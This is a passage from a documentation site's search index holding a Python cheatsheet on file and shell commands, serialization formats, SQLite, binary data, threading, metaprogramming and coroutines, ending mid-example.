pattern.\n</code></pre> <pre><code>&lt;str&gt;  = str(&lt;Path&gt;)                # Returns path as a string.\n&lt;file&gt; = open(&lt;Path&gt;)               # Also &lt;Path&gt;.read/write_text/bytes().\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#os-commands","title":"OS Commands","text":"<pre><code>import os, shutil, subprocess\n</code></pre> <pre><code>os.chdir(&lt;path&gt;)                 # Changes the current working directory.\nos.mkdir(&lt;path&gt;, mode=0o777)     # Creates a directory. Mode is in octal.\nos.makedirs(&lt;path&gt;, mode=0o777)  # Creates all path's dirs. Also: `exist_ok=False`.\n</code></pre> <pre><code>shutil.copy(from, to)            # Copies the file. 'to' can exist or be a dir.\nshutil.copytree(from, to)        # Copies the directory. 'to' must not exist.\n</code></pre> <pre><code>os.rename(from, to)              # Renames/moves the file or directory.\nos.replace(from, to)             # Same, but overwrites 'to' if it exists.\n</code></pre> <pre><code>os.remove(&lt;path&gt;)                # Deletes the file.\nos.rmdir(&lt;path&gt;)                 # Deletes the empty directory.\nshutil.rmtree(&lt;path&gt;)            # Deletes the directory.\n</code></pre> <ul> <li>Paths can be either strings, Paths or DirEntry objects.</li> <li>Functions report OS related errors by raising either OSError or one of its subclasses.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#shell-commands","title":"Shell Commands","text":"<pre><code>&lt;pipe&gt; = os.popen('&lt;command&gt;')   # Executes command in sh/cmd and returns its stdout pipe.\n&lt;str&gt;  = &lt;pipe&gt;.read(size=-1)    # Reads 'size' chars or until EOF. Also readline/s().\n&lt;int&gt;  = &lt;pipe&gt;.close()          # Closes the pipe. Returns None on success, int on error.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#sends-1-1-to-the-basic-calculator-and-captures-its-output","title":"Sends '1 + 1' to the basic calculator and captures its output:","text":"<pre><code>&gt;&gt;&gt; subprocess.run('bc', input='1 + 1\\n', capture_output=True, text=True)\nCompletedProcess(args='bc', returncode=0, stdout='2\\n', stderr='')\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#sends-testin-to-the-basic-calculator-running-in-standard-mode-and-saves-its-output-to-testout","title":"Sends test.in to the basic calculator running in standard mode and saves its output to test.out:","text":"<pre><code>&gt;&gt;&gt; from shlex import split\n&gt;&gt;&gt; os.popen('echo 1 + 1 &gt; test.in')\n&gt;&gt;&gt; subprocess.run(split('bc -s'), stdin=open('test.in'), stdout=open('test.out', 'w'))\nCompletedProcess(args=['bc', '-s'], returncode=0)\n&gt;&gt;&gt; open('test.out').read()\n'2\\n'\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#json","title":"JSON","text":"<p>Text file format for storing collections of strings and numbers.</p> <pre><code>import json\n&lt;str&gt;    = json.dumps(&lt;object&gt;)    # Converts object to JSON string.\n&lt;object&gt; = json.loads(&lt;str&gt;)       # Converts JSON string to object.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#read-object-from-json-file","title":"Read Object from JSON File","text":"<pre><code>def read_json_file(filename):\n    with open(filename, encoding='utf-8') as file:\n        return json.load(file)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#write-object-to-json-file","title":"Write Object to JSON File","text":"<pre><code>def write_to_json_file(filename, an_object):\n    with open(filename, 'w', encoding='utf-8') as file:\n        json.dump(an_object, file, ensure_ascii=False, indent=2)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#pickle","title":"Pickle","text":"<p>Binary file format for storing Python objects.</p> <pre><code>import pickle\n&lt;bytes&gt;  = pickle.dumps(&lt;object&gt;)  # Converts object to bytes.\n&lt;object&gt; = pickle.loads(&lt;bytes&gt;)   # Converts bytes to object.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#read-object-from-file","title":"Read Object from File","text":"<pre><code>def read_pickle_file(filename):\n    with open(filename, 'rb') as file:\n        return pickle.load(file)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#write-object-to-file","title":"Write Object to File","text":"<pre><code>def write_to_pickle_file(filename, an_object):\n    with open(filename, 'wb') as file:\n        pickle.dump(an_object, file)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#csv","title":"CSV","text":"<p>Text file format for storing spreadsheets.</p> <pre><code>import csv\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#read","title":"Read","text":"<pre><code>&lt;reader&gt; = csv.reader(&lt;file&gt;)       # Also: `dialect='excel', delimiter=','`.\n&lt;list&gt;   = next(&lt;reader&gt;)           # Returns next row as a list of strings.\n&lt;list&gt;   = list(&lt;reader&gt;)           # Returns a list of remaining rows.\n</code></pre> <ul> <li>File must be opened with a <code>'newline=\"\"'</code> argument, or newlines embedded inside quoted fields will not be interpreted correctly!</li> <li>To print the spreadsheet to the console use Tabulate library.</li> <li>For XML and binary Excel files (xlsx, xlsm and xlsb) use Pandas library.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#write","title":"Write","text":"<pre><code>&lt;writer&gt; = csv.writer(&lt;file&gt;)       # Also: `dialect='excel', delimiter=','`.\n&lt;writer&gt;.writerow(&lt;collection&gt;)     # Encodes objects using `str(&lt;el&gt;)`.\n&lt;writer&gt;.writerows(&lt;coll_of_coll&gt;)  # Appends multiple rows.\n</code></pre> <ul> <li>File must be opened with a <code>'newline=\"\"'</code> argument, or '\\r' will be added in front of every '\\n' on platforms that use '\\r\\n' line endings!</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#parameters","title":"Parameters","text":"<ul> <li><code>'dialect'</code> - Master parameter that sets the default values. String or a Dialect object.</li> <li><code>'delimiter'</code> - A one-character string used to separate fields.</li> <li><code>'quotechar'</code> - Character for quoting fields that contain special characters.</li> <li><code>'doublequote'</code> - Whether quotechars inside fields are/get doubled or escaped.</li> <li><code>'skipinitialspace'</code> - Whether whitespace after delimiter gets stripped by reader.</li> <li><code>'lineterminator'</code> - How writer terminates rows. Reader is hardcoded to '\\n', '\\r', '\\r\\n'.</li> <li><code>'quoting'</code> - 0: As necessary, 1: All, 2: All but numbers which are read as floats, 3: None.</li> <li><code>'escapechar'</code> - Character for escaping quotechars if doublequote is False.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#dialects","title":"Dialects","text":"<pre><code>+------------------+--------------+--------------+--------------+\n|                  |     excel    |   excel-tab  |     unix     |\n+------------------+--------------+--------------+--------------+\n| delimiter        |       ','    |      '\\t'    |       ','    |\n| quotechar        |       '\"'    |       '\"'    |       '\"'    |\n| doublequote      |      True    |      True    |      True    |\n| skipinitialspace |     False    |     False    |     False    |\n| lineterminator   |    '\\r\\n'    |    '\\r\\n'    |      '\\n'    |\n| quoting          |         0    |         0    |         1    |\n| escapechar       |      None    |      None    |      None    |\n+------------------+--------------+--------------+--------------+\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#read-rows-from-csv-file","title":"Read Rows from CSV File","text":"<pre><code>def read_csv_file(filename, dialect='excel'):\n    with open(filename, encoding='utf-8', newline='') as file:\n        return list(csv.reader(file, dialect))\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#write-rows-to-csv-file","title":"Write Rows to CSV File","text":"<pre><code>def write_to_csv_file(filename, rows, dialect='excel'):\n    with open(filename, 'w', encoding='utf-8', newline='') as file:\n        writer = csv.writer(file, dialect)\n        writer.writerows(rows)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#sqlite","title":"SQLite","text":"<p>A server-less database engine that stores each database into a separate file.</p>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#connect","title":"Connect","text":"<p>Opens a connection to the database file. Creates a new file if path doesn't exist.</p> <pre><code>import sqlite3\n&lt;conn&gt; = sqlite3.connect(&lt;path&gt;)                # Also ':memory:'.\n&lt;conn&gt;.close()                                  # Closes the connection.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#read_1","title":"Read","text":"<p>Returned values can be of type str, int, float, bytes or None.</p> <pre><code>&lt;cursor&gt; = &lt;conn&gt;.execute('&lt;query&gt;')            # Can raise a subclass of sqlite3.Error.\n&lt;tuple&gt;  = &lt;cursor&gt;.fetchone()                  # Returns next row. Also next(&lt;cursor&gt;).\n&lt;list&gt;   = &lt;cursor&gt;.fetchall()                  # Returns remaining rows. Also list(&lt;cursor&gt;).\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#write_1","title":"Write","text":"<pre><code>&lt;conn&gt;.execute('&lt;query&gt;')                       # Can raise a subclass of sqlite3.Error.\n&lt;conn&gt;.commit()                                 # Saves all changes since the last commit.\n&lt;conn&gt;.rollback()                               # Discards all changes since the last commit.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#or","title":"Or:","text":"<pre><code>with &lt;conn&gt;:                                    # Exits the block with commit() or rollback(),\n    &lt;conn&gt;.execute('&lt;query&gt;')                   # depending on whether any exception occurred.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#placeholders","title":"Placeholders","text":"<ul> <li>Passed values can be of type str, int, float, bytes, None, bool, datetime.date or datetime.datetime.</li> <li>Bools will be stored and returned as ints and dates as ISO formatted strings.</li> </ul> <pre><code>&lt;conn&gt;.execute('&lt;query&gt;', &lt;list/tuple&gt;)         # Replaces '?'s in query with values.\n&lt;conn&gt;.execute('&lt;query&gt;', &lt;dict/namedtuple&gt;)    # Replaces ':&lt;key&gt;'s with values.\n&lt;conn&gt;.executemany('&lt;query&gt;', &lt;coll_of_above&gt;)  # Runs execute() multiple times.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#example","title":"Example","text":"<p>Values are not actually saved in this example because <code>'conn.commit()'</code> is omitted!</p> <pre><code>&gt;&gt;&gt; conn = sqlite3.connect('test.db')\n&gt;&gt;&gt; conn.execute('CREATE TABLE person (person_id INTEGER PRIMARY KEY, name, height)')\n&gt;&gt;&gt; conn.execute('INSERT INTO person VALUES (NULL, ?, ?)', ('Jean-Luc', 187)).lastrowid\n1\n&gt;&gt;&gt; conn.execute('SELECT * FROM person').fetchall()\n[(1, 'Jean-Luc', 187)]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#mysql","title":"MySQL","text":"<p>Has a very similar interface, with differences listed below.</p> <pre><code># $ pip3 install mysql-connector\nfrom mysql import connector\n&lt;conn&gt;   = connector.connect(host=&lt;str&gt;, \u2026)     # `user=&lt;str&gt;, password=&lt;str&gt;, database=&lt;str&gt;`.\n&lt;cursor&gt; = &lt;conn&gt;.cursor()                      # Only cursor has execute() method.\n&lt;cursor&gt;.execute('&lt;query&gt;')                     # Can raise a subclass of connector.Error.\n&lt;cursor&gt;.execute('&lt;query&gt;', &lt;list/tuple&gt;)       # Replaces '%s's in query with values.\n&lt;cursor&gt;.execute('&lt;query&gt;', &lt;dict/namedtuple&gt;)  # Replaces '%(&lt;key&gt;)s's with values.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#bytes","title":"Bytes","text":"<p>Bytes object is an immutable sequence of single bytes. Mutable version is called bytearray.</p> <pre><code>&lt;bytes&gt; = b'&lt;str&gt;'                       # Only accepts ASCII characters and \\x00-\\xff.\n&lt;int&gt;   = &lt;bytes&gt;[&lt;index&gt;]               # Returns an int in range from 0 to 255.\n&lt;bytes&gt; = &lt;bytes&gt;[&lt;slice&gt;]               # Returns bytes even if it has only one element.\n&lt;bytes&gt; = &lt;bytes&gt;.join(&lt;coll_of_bytes&gt;)  # Joins elements using bytes as a separator.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#encode_1","title":"Encode","text":"<pre><code>&lt;bytes&gt; = bytes(&lt;coll_of_ints&gt;)          # Ints must be in range from 0 to 255.\n&lt;bytes&gt; = bytes(&lt;str&gt;, 'utf-8')          # Or: &lt;str&gt;.encode('utf-8')\n&lt;bytes&gt; = &lt;int&gt;.to_bytes(n_bytes, \u2026)     # `byteorder='big/little', signed=False`.\n&lt;bytes&gt; = bytes.fromhex('&lt;hex&gt;')         # Hex pairs can be separated by whitespaces.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#decode_1","title":"Decode","text":"<pre><code>&lt;list&gt;  = list(&lt;bytes&gt;)                  # Returns ints in range from 0 to 255.\n&lt;str&gt;   = str(&lt;bytes&gt;, 'utf-8')          # Or: &lt;bytes&gt;.decode('utf-8')\n&lt;int&gt;   = int.from_bytes(&lt;bytes&gt;, \u2026)     # `byteorder='big/little', signed=False`.\n'&lt;hex&gt;' = &lt;bytes&gt;.hex()                  # Returns hex pairs. Accepts `sep=&lt;str&gt;`.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#read-bytes-from-file","title":"Read Bytes from File","text":"<pre><code>def read_bytes(filename):\n    with open(filename, 'rb') as file:\n        return file.read()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#write-bytes-to-file","title":"Write Bytes to File","text":"<pre><code>def write_bytes(filename, bytes_obj):\n    with open(filename, 'wb') as file:\n        file.write(bytes_obj)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#struct","title":"Struct","text":"<ul> <li>Module that performs conversions between a sequence of numbers and a bytes object.</li> <li>System\u2019s type sizes, byte order, and alignment rules are used by default.</li> </ul> <pre><code>from struct import pack, unpack\n&lt;bytes&gt; = pack('&lt;format&gt;', &lt;el_1&gt; [, ...])  # Packages arguments into bytes object.\n&lt;tuple&gt; = unpack('&lt;format&gt;', &lt;bytes&gt;)       # Use iter_unpack() for iterator of tuples.\n</code></pre> <pre><code>&gt;&gt;&gt; pack('&gt;hhl', 1, 2, 3)\nb'\\x00\\x01\\x00\\x02\\x00\\x00\\x00\\x03'\n&gt;&gt;&gt; unpack('&gt;hhl', b'\\x00\\x01\\x00\\x02\\x00\\x00\\x00\\x03')\n(1, 2, 3)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#format_2","title":"Format","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#for-standard-type-sizes-and-manual-alignment-padding-start-format-string-with","title":"For standard type sizes and manual alignment (padding) start format string with:","text":"<ul> <li><code>'='</code> - System's byte order (usually little-endian).</li> <li><code>'&lt;'</code> - Little-endian.</li> <li><code>'&gt;'</code> - Big-endian (also <code>'!'</code>).</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#besides-numbers-pack-and-unpack-also-support-bytes-objects-as-part-of-the-seqence","title":"Besides numbers, pack() and unpack() also support bytes objects as part of the seqence:","text":"<ul> <li><code>'c'</code> - A bytes object with a single element. Use <code>'x'</code> for pad byte.</li> <li><code>'&lt;n&gt;s'</code> - A bytes object with n elements.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#integer-types-use-a-capital-letter-for-unsigned-type-minimum-and-standard-sizes-are-in-brackets","title":"Integer types. Use a capital letter for unsigned type. Minimum and standard sizes are in brackets:","text":"<ul> <li><code>'b'</code> - char (1/1)</li> <li><code>'h'</code> - short (2/2)</li> <li><code>'i'</code> - int (2/4)</li> <li><code>'l'</code> - long (4/4)</li> <li><code>'q'</code> - long long (8/8)</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#floating-point-types","title":"Floating point types:","text":"<ul> <li><code>'f'</code> - float (4/4)</li> <li><code>'d'</code> - double (8/8)</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#array","title":"Array","text":"<p>List that can only hold numbers of a predefined type. Available types and their minimum sizes in bytes are listed above. Sizes and byte order are always determined by the system.</p> <pre><code>from array import array\n&lt;array&gt; = array('&lt;typecode&gt;', &lt;collection&gt;)    # Array from collection of numbers.\n&lt;array&gt; = array('&lt;typecode&gt;', &lt;bytes&gt;)         # Array from bytes object.\n&lt;array&gt; = array('&lt;typecode&gt;', &lt;array&gt;)         # Treats array as a sequence of numbers.\n&lt;bytes&gt; = bytes(&lt;array&gt;)                       # Or: &lt;array&gt;.tobytes()\n&lt;file&gt;.write(&lt;array&gt;)                          # Writes array to the binary file.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#memory-view","title":"Memory View","text":"<ul> <li>A sequence object that points to the memory of another object.</li> <li>Each element can reference a single or multiple consecutive bytes, depending on format.</li> <li>Order and number of elements can be changed with slicing.</li> <li>Casting only works between char and other types and uses system's sizes.</li> <li>Byte order is always determined by the system.</li> </ul> <pre><code>&lt;mview&gt; = memoryview(&lt;bytes/bytearray/array&gt;)  # Immutable if bytes, else mutable.\n&lt;real&gt;  = &lt;mview&gt;[&lt;index&gt;]                     # Returns an int or a float.\n&lt;mview&gt; = &lt;mview&gt;[&lt;slice&gt;]                     # Mview with rearranged elements.\n&lt;mview&gt; = &lt;mview&gt;.cast('&lt;typecode&gt;')           # Casts memoryview to the new format.\n&lt;mview&gt;.release()                              # Releases the object's memory buffer.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#decode_2","title":"Decode","text":"<pre><code>&lt;bytes&gt; = bytes(&lt;mview&gt;)                       # Creates a new bytes object.\n&lt;bytes&gt; = &lt;bytes&gt;.join(&lt;coll_of_mviews&gt;)       # Joins mviews using bytes object as sep.\n&lt;array&gt; = array('&lt;typecode&gt;', &lt;mview&gt;)         # Treats mview as a sequence of numbers.\n&lt;file&gt;.write(&lt;mview&gt;)                          # Writes mview to the binary file.\n</code></pre> <pre><code>&lt;list&gt;  = list(&lt;mview&gt;)                        # Returns a list of ints or floats.\n&lt;str&gt;   = str(&lt;mview&gt;, 'utf-8')                # Treats mview as a bytes object.\n&lt;int&gt;   = int.from_bytes(&lt;mview&gt;, \u2026)           # `byteorder='big/little', signed=False`.\n'&lt;hex&gt;' = &lt;mview&gt;.hex()                        # Treats mview as a bytes object.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#deque","title":"Deque","text":"<p>A thread-safe list with efficient appends and pops from either side. Pronounced \"deck\".</p> <pre><code>from collections import deque\n&lt;deque&gt; = deque(&lt;collection&gt;, maxlen=None)\n</code></pre> <pre><code>&lt;deque&gt;.appendleft(&lt;el&gt;)                       # Opposite element is dropped if full.\n&lt;deque&gt;.extendleft(&lt;collection&gt;)               # Collection gets reversed.\n&lt;el&gt; = &lt;deque&gt;.popleft()                       # Raises IndexError if empty.\n&lt;deque&gt;.rotate(n=1)                            # Rotates elements to the right.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#threading","title":"Threading","text":"<ul> <li>CPython interpreter can only run a single thread at a time.</li> <li>That is why using multiple threads won't result in a faster execution, unless at least one of the threads contains an I/O operation.</li> </ul> <pre><code>from threading import Thread, RLock, Semaphore, Event, Barrier\nfrom concurrent.futures import ThreadPoolExecutor\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#thread","title":"Thread","text":"<pre><code>&lt;Thread&gt; = Thread(target=&lt;function&gt;)           # Use `args=&lt;collection&gt;` to set the arguments.\n&lt;Thread&gt;.start()                               # Starts the thread.\n&lt;bool&gt; = &lt;Thread&gt;.is_alive()                   # Checks if the thread has finished executing.\n&lt;Thread&gt;.join()                                # Waits for the thread to finish.\n</code></pre> <ul> <li>Use <code>'kwargs=&lt;dict&gt;'</code> to pass keyword arguments to the function.</li> <li>Use <code>'daemon=True'</code>, or the program will not be able to exit while the thread is alive.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#lock","title":"Lock","text":"<pre><code>&lt;lock&gt; = RLock()                               # Lock that can only be released by the owner.\n&lt;lock&gt;.acquire()                               # Waits for the lock to be available.\n&lt;lock&gt;.release()                               # Makes the lock available again.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#or_1","title":"Or:","text":"<pre><code>with &lt;lock&gt;:                                   # Enters the block by calling acquire(),\n    ...                                        # and exits it with release().\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#semaphore-event-barrier","title":"Semaphore, Event, Barrier","text":"<pre><code>&lt;Semaphore&gt; = Semaphore(value=1)               # Lock that can be acquired by 'value' threads.\n&lt;Event&gt;     = Event()                          # Method wait() blocks until set() is called.\n&lt;Barrier&gt;   = Barrier(n_times)                 # Wait() blocks until it's called n_times.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#thread-pool-executor","title":"Thread Pool Executor","text":"<ul> <li>Object that manages thread execution.</li> <li>An object with the same interface called ProcessPoolExecutor provides true parallelism by running a separate interpreter in each process. All arguments must be pickable.</li> </ul> <pre><code>&lt;Exec&gt; = ThreadPoolExecutor(max_workers=None)  # Or: `with ThreadPoolExecutor() as &lt;name&gt;: \u2026`\n&lt;Exec&gt;.shutdown(wait=True)                     # Blocks until all threads finish executing.\n</code></pre> <pre><code>&lt;iter&gt; = &lt;Exec&gt;.map(&lt;func&gt;, &lt;args_1&gt;, ...)     # A multithreaded and non-lazy map().\n&lt;Futr&gt; = &lt;Exec&gt;.submit(&lt;func&gt;, &lt;arg_1&gt;, ...)   # Starts a thread and returns its Future object.\n&lt;bool&gt; = &lt;Futr&gt;.done()                         # Checks if the thread has finished executing.\n&lt;obj&gt;  = &lt;Futr&gt;.result()                       # Waits for thread to finish and returns result.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#queue","title":"Queue","text":"<p>A thread-safe FIFO queue. For LIFO queue use LifoQueue.</p> <pre><code>from queue import Queue\n&lt;Queue&gt; = Queue(maxsize=0)\n</code></pre> <pre><code>&lt;Queue&gt;.put(&lt;el&gt;)                              # Blocks until queue stops being full.\n&lt;Queue&gt;.put_nowait(&lt;el&gt;)                       # Raises queue.Full exception if full.\n&lt;el&gt; = &lt;Queue&gt;.get()                           # Blocks until queue stops being empty.\n&lt;el&gt; = &lt;Queue&gt;.get_nowait()                    # Raises queue.Empty exception if empty.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#operator","title":"Operator","text":"<p>Module of functions that provide the functionality of operators.</p> <pre><code>import operator as op\n&lt;el&gt;      = op.add/sub/mul/truediv/floordiv/mod(&lt;el&gt;, &lt;el&gt;)  # +, -, *, /, //, %\n&lt;int/set&gt; = op.and_/or_/xor(&lt;int/set&gt;, &lt;int/set&gt;)            # &amp;, |, ^\n&lt;bool&gt;    = op.eq/ne/lt/le/gt/ge(&lt;sortable&gt;, &lt;sortable&gt;)     # ==, !=, &lt;, &lt;=, &gt;, &gt;=\n&lt;func&gt;    = op.itemgetter/attrgetter/methodcaller(&lt;obj&gt;)     # [index/key], .name, .name()\n</code></pre> <pre><code>elementwise_sum  = map(op.add, list_a, list_b)\nsorted_by_second = sorted(&lt;collection&gt;, key=op.itemgetter(1))\nsorted_by_both   = sorted(&lt;collection&gt;, key=op.itemgetter(1, 0))\nproduct_of_elems = functools.reduce(op.mul, &lt;collection&gt;)\nunion_of_sets    = functools.reduce(op.or_, &lt;coll_of_sets&gt;)\nfirst_element    = op.methodcaller('pop', 0)(&lt;list&gt;)\n</code></pre> <ul> <li>Binary operators require objects to have and(), or(), xor() and invert() special methods, unlike logical operators that work on all types of objects.</li> <li>Also: <code>'&lt;bool&gt; = &lt;bool&gt; &amp;|^ &lt;bool&gt;'</code> and <code>'&lt;int&gt; = &lt;bool&gt; &amp;|^ &lt;int&gt;'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#introspection","title":"Introspection","text":"<p>Inspecting code at runtime.</p>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#variables","title":"Variables","text":"<pre><code>&lt;list&gt; = dir()                             # Names of local variables (incl. functions).\n&lt;dict&gt; = vars()                            # Dict of local variables. Also locals().\n&lt;dict&gt; = globals()                         # Dict of global variables.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#attributes_1","title":"Attributes","text":"<pre><code>&lt;list&gt; = dir(&lt;object&gt;)                     # Names of object's attributes (incl. methods).\n&lt;dict&gt; = vars(&lt;object&gt;)                    # Dict of writable attributes. Also &lt;obj&gt;.__dict__.\n&lt;bool&gt; = hasattr(&lt;object&gt;, '&lt;attr_name&gt;')  # Checks if getattr() raises an AttributeError.\nvalue  = getattr(&lt;object&gt;, '&lt;attr_name&gt;')  # Raises AttributeError if attribute is missing.\nsetattr(&lt;object&gt;, '&lt;attr_name&gt;', value)    # Only works on objects with '__dict__' attribute.\ndelattr(&lt;object&gt;, '&lt;attr_name&gt;')           # Same. Also `del &lt;object&gt;.&lt;attr_name&gt;`.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#parameters_1","title":"Parameters","text":"<pre><code>from inspect import signature\n&lt;Sig&gt;  = signature(&lt;function&gt;)             # Function's Signature object.\n&lt;dict&gt; = &lt;Sig&gt;.parameters                  # Dict of function's Parameter objects.\n&lt;str&gt;  = &lt;Param&gt;.name                      # Parameter's name.\n&lt;memb&gt; = &lt;Param&gt;.kind                      # Member of ParameterKind enum.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#metaprogramming","title":"Metaprogramming","text":"<p>Code that generates code.</p>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#type_1","title":"Type","text":"<p>Type is the root class. If only passed an object it returns its type (class). Otherwise it creates a new class.</p> <pre><code>&lt;class&gt; = type('&lt;class_name&gt;', &lt;tuple_of_parents&gt;, &lt;dict_of_class_attributes&gt;)\n</code></pre> <pre><code>&gt;&gt;&gt; Z = type('Z', (), {'a': 'abcde', 'b': 12345})\n&gt;&gt;&gt; z = Z()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#meta-class","title":"Meta Class","text":"<p>A class that creates classes.</p> <pre><code>def my_meta_class(name, parents, attrs):\n    attrs['a'] = 'abcde'\n    return type(name, parents, attrs)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#or_2","title":"Or:","text":"<pre><code>class MyMetaClass(type):\n    def __new__(cls, name, parents, attrs):\n        attrs['a'] = 'abcde'\n        return type.__new__(cls, name, parents, attrs)\n</code></pre> <ul> <li>New() is a class method that gets called before init(). If it returns an instance of its class, then that instance gets passed to init() as a 'self' argument.</li> <li>It receives the same arguments as init(), except for the first one that specifies the desired type of the returned instance (MyMetaClass in our case).</li> <li>Like in our case, new() can also be called directly, usually from a new() method of a child class (<code>def __new__(cls): return super().__new__(cls)</code>).</li> <li>The only difference between the examples above is that my_meta_class() returns a class of type type, while MyMetaClass() returns a class of type MyMetaClass.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#metaclass-attribute","title":"Metaclass Attribute","text":"<p>Right before a class is created it checks if it has the 'metaclass' attribute defined. If not, it recursively checks if any of his parents has it defined and eventually comes to type().</p> <pre><code>class MyClass(metaclass=MyMetaClass):\n    b = 12345\n</code></pre> <pre><code>&gt;&gt;&gt; MyClass.a, MyClass.b\n('abcde', 12345)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#type-diagram","title":"Type Diagram","text":"<pre><code>type(MyClass) == MyMetaClass         # MyClass is an instance of MyMetaClass.\ntype(MyMetaClass) == type            # MyMetaClass is an instance of type.\n</code></pre> <pre><code>+-------------+-------------+\n|   Classes   | Metaclasses |\n+-------------+-------------|\n|   MyClass --&gt; MyMetaClass |\n|             |     v       |\n|    object -----&gt; type &lt;+  |\n|             |     ^ +--+  |\n|     str ----------+       |\n+-------------+-------------+\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#inheritance-diagram","title":"Inheritance Diagram","text":"<pre><code>MyClass.__base__ == object           # MyClass is a subclass of object.\nMyMetaClass.__base__ == type         # MyMetaClass is a subclass of type.\n</code></pre> <pre><code>+-------------+-------------+\n|   Classes   | Metaclasses |\n+-------------+-------------|\n|   MyClass   | MyMetaClass |\n|      v      |     v       |\n|    object &lt;----- type     |\n|      ^      |             |\n|     str     |             |\n+-------------+-------------+\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#eval","title":"Eval","text":"<pre><code>&gt;&gt;&gt; from ast import literal_eval\n&gt;&gt;&gt; literal_eval('[1, 2, 3]')\n[1, 2, 3]\n&gt;&gt;&gt; literal_eval('1 + 2')\nValueError: malformed node or string\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#coroutines","title":"Coroutines","text":"<ul> <li>Coroutines have a lot in common with threads, but unlike threads, they only give up control when they call another coroutine and they don\u2019t use as much memory.</li> <li>Coroutine definition starts with <code>'async'</code> and its call with <code>'await'</code>.</li> <li><code>'asyncio.run(&lt;coroutine&gt;)'</code> is the main entry point for asynchronous programs.</li> <li>Functions wait(), gather() and as_completed() can be used when multiple coroutines need to be started at the same time.</li> <li>Asyncio module also provides its own Queue, Event, Lock and Semaphore classes.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#runs-a-terminal-game-where-you-control-an-asterisk-that-must-avoid-numbers","title":"Runs a terminal game where you control an asterisk that must avoid numbers:","text":"<pre><code>import asyncio, collections, curses, curses.textpad, enum, random\n\nP = collections.namedtuple('P', 'x y')         # 